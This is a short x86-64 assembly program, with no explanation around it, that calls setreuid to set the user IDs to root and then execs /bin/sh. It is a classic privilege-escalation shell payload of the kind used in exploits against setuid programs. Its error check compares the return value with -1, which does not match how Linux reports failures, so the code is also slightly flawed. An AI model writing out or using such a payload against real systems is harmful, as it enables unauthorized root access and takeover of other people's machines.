section .data
    errMsg db 'System call failed', 0
    shell db '/bin/sh', 0

section .text
    global _start
    _start:
        ; set up registers for setreuid syscall
        xor rax, rax              ; syscall number (sys_setreuid)
        mov al, 0x71              ; setreuid syscall number
        xor rdi, rdi              ; set real user id to 0
        xor rsi, rsi              ; set effective user id to 0

        ; make the system call
        syscall

        ; check if the system call failed
        cmp rax, -1
        jne success

    fail:
        ; system call failed, print error message
        mov rax, 1                  ; syscall number (sys_write)
        mov rdi, 1                  ; file descriptor (stdout)
        mov rsi, errMsg             ; message to write
        mov rdx, 18                 ; message length
        syscall
        jmp exit

    success:
        ; system call succeeded, continue program...
        xor rax, rax
        mov al, 59                  ; syscall number (sys_execve)
        mov rdi, shell              ; filename (/bin/sh)
        xor rsi, rsi                ; argv (null)
        xor rdx, rdx                ; envp (null)
        syscall

    exit:
        ; exit the program
        xor rax, rax
        mov al, 60
        xor rdi, rdi
        syscall